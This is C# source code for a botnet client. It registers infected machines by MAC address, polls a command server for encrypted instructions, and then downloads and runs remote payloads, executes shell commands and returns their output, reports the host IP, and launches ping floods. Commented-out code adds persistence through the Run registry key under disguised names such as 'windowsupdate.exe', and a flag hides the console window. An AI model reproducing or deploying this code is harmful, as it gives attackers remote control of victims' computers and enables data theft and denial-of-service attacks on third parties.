using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using Microsoft.Win32;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Timers;


namespace client
{
    class Program
    {
        //setable vars
      static  string key = "abcdefghijuklmno0123456789012345"; //32 characters long
       static string campID = "test"; //can be what ever      
       static string privKey = "testtest"; //can be what ever
     static  string pingponger = "pingpong";
        
 
       static string selfID = GetMACAddress(); //used for idenification and commuinication progress
        static string details = "mac"; //TODO: add more details?
       static Timer myTimer;
       static string conID = campID;
       static string reconID; //simply double md5, easier with diffrent variable
      


       [ComVisibleAttribute(false)]

       [DllImport("user32.dll")]
       public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

       [DllImport("user32.dll")]
       static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

       [DllImport("user32.dll")]

       static extern int GetForegroundWindow();

       [DllImport("user32.dll")]

       static extern int GetWindowText(int hWnd, StringBuilder text, int count);


        
        static void Main(string[] args)
        {


            
                                 Console.Title = "Client";
                     IntPtr CurrWind = FindWindow(null, "Client");
                     ShowWindow(CurrWind, 1); //set to 0 to make window disapear
            /*
             RegistryKey rkApp = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
              rkApp.SetValue("winlogs.exe", System.Reflection.Assembly.GetEntryAssembly().Location);
              */

            conID += selfID;
                   conID += privKey;
                   reconID =MD5(MD5(conID));

         
            /*    string exepath;
                   exepath = System.Reflection.Assembly.GetEntryAssembly().Location;
                   string destFile = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                   System.IO.File.Copy(exepath, destFile, true);
            */

            string botLoc = campID;
                   botLoc += privKey;

                   pingponger += selfID;
                   pingponger = MD5(pingponger);
                   
    
            details += GetMACAddress();
            //START
           whoami(botLoc, 0);
           
             
    myTimer = new System.Timers.Timer();
    myTimer.Elapsed += new ElapsedEventHandler(checkForCmd);
    myTimer.Interval = 1000;      
    myTimer.Enabled = true;

    Console.ReadLine();

    


        }


        private static void checkForCmd(object source, ElapsedEventArgs e)
        {

            HttpHandler httpDo = new HttpHandler();
            string text = getContent(MD5(conID));
           
         
            if ( text != null)
          {
              Console.WriteLine("command: " + text);
                if (text != "NULL"){
              doCommands(text);
              
              httpDo.addPost(MD5(conID), "NULL", key);
                }
                pingpong();
          }
        }

        private static void pingpong()
        {
            HttpHandler httpDo = new HttpHandler();
          string  s = getContent(pingponger);
          
            if (s != null)
            {
                if (s.Contains("PING"))
                {
                    httpDo.addPost(pingponger, "PONG", key);
                }
            }

        } 
        private static bool doCommands(string text)
        {
               cmdMethods cDo = new cmdMethods();//calls the cmdMehods class to do all the commands
                   bool nexted= false;
                   if (text.Contains("|"))
                   {
                       string[] singleCommand = text.Split('|');
                       foreach (string cmd in singleCommand)
                       {
                         nexted =  execCMD(cmd);

                       }
                   }
                   else
                   {
                       nexted = execCMD(text);

                   }
                       return nexted;
                   
            
        } // sort commands by multi-commands or just single command
        private static bool execCMD(string cmd)
        {
            cmdMethods cDo = new cmdMethods();
            HttpHandler httpDo = new HttpHandler();
            bool nexted = false;
            //add commands here 
            if (cmd.StartsWith("next:"))// no touching unless you know what you're doing
            {
                conID = cmd.Replace("next:", "");
                nexted = true;

            }
            if (cmd.StartsWith("httpexec:")) //simple command example
            {

                cDo.downloadrun(cmd.Replace("httpexec:", ""));
            }
            
            if (cmd.StartsWith("getip")) {
                string ip = cDo.getIp();
                httpDo.addPost(reconID,ip, key);
            }
            if (cmd.StartsWith("ddos:"))
            {
                string DDoSIP = cmd.Replace("ddos:", "");
                System.Diagnostics.Process.Start("ping", DDoSIP);
            }
            if (cmd.StartsWith("ping"))
            {
                httpDo.addPost(reconID, "pong " + DateTime.Now, key);
            }
                        if (cmd.StartsWith("cmd:"))
            {
                string output = cDo.command(cmd.Replace("cmd:", "/c "));
                httpDo.addPost(reconID,output, key);
            }

            return nexted;
        }        
        private static string getContent(string id)
        {
            HttpHandler httpDo = new HttpHandler();
            string content = Decrypt(httpDo.getPost(id), key);
            string c=null;
            try
            {
                c = content.TrimEnd('\0'); //removes null bytes that comes with string
            }
            catch (NullReferenceException) { }
                return c;
        } //get the decrypted content of an id
        private static string whoami(string botLoc, int previousnumber)
        {
            HttpHandler httpDo = new HttpHandler();
            string botLocmd5 = MD5(botLoc);
            if (httpDo.getPost(botLocmd5) != null)
            {
                if (itsme(Decrypt(httpDo.getPost(botLocmd5),key)))
                {
                    
                    return botLocmd5;
                }
                else
                {
                    botLoc = campID;
                    botLoc += privKey;
                    previousnumber++;
                    botLoc += previousnumber;
                    return whoami(botLoc, previousnumber);


                }

            }
            else
            {
                 httpDo.addPost(botLocmd5, details, key);
                 return botLocmd5;
            }
        } //register the mac in the list. returns self non-mac-"encrypted" id
        private static bool itsme(string content)
        {
            string macless = content.Replace("mac", "");
            macless = macless.Substring(0,12);
            string mac = GetMACAddress();
            if (macless == mac)
            {
               
                return true;
            }
         
            return false;
        } //check if the mac addresses match
        private static string MD5(string phase)
        {

            if (phase != null)
            {
                // byte array representation of that string
                byte[] encodedPassword = new UTF8Encoding().GetBytes(phase);

                // need MD5 to calculate the hash
                byte[] hash = ((HashAlgorithm)CryptoConfig.CreateFromName("MD5")).ComputeHash(encodedPassword);

                // string representation (similar to UNIX format)
                string encoded = BitConverter.ToString(hash)
                    // without dashes
                   .Replace("-", string.Empty)
                    // make lowercase
                   .ToLower();
                return encoded;
            }
            return null;
        } //encrypt in MD5

     /*   public void copy()
        {
            try
            {
                string exe = Path.GetFileName(Application.ExecutablePath);
                string sp = Application.StartupPath + "\\" + exe;
                string destino = Environment.SystemDirectory.ToString();
                File.Copy(sp, destino + "\\windowsupdate.exe");
                //REGISTRO
                RegistryKey miClave = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
                miClave.SetValue("Windows Update", destino + "\\windowsupdate.exe");
            }
            catch (Exception ex)
            {
            }
        }
        */
        public static string Decrypt(string toDecrypt, string key)
        {
            
            if (toDecrypt != null) {
               
            byte[] keyArray = UTF8Encoding.UTF8.GetBytes(key); // AES-256 key
            byte[] toEncryptArray = Convert.FromBase64String(toDecrypt);
            RijndaelManaged rDel = new RijndaelManaged();
            rDel.Key = keyArray;
            rDel.Mode = CipherMode.ECB; 
            rDel.Padding = PaddingMode.None; // better lang support
            ICryptoTransform cTransform = rDel.CreateDecryptor();
            byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
            return UTF8Encoding.UTF8.GetString(resultArray);
            }
                    else {return null;}
       }       //decrypt AES 256bit
        public static string GetMACAddress()
        {
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            String sMacAddress = string.Empty;
            foreach (NetworkInterface adapter in nics)
            {
                if (sMacAddress == String.Empty)// only return MAC Address from first card  
                {
                    //IPInterfaceProperties properties = adapter.GetIPProperties(); Line is not required
                    sMacAddress = adapter.GetPhysicalAddress().ToString();
                }
            } return sMacAddress;
        }  //get the mac address.
    }
}
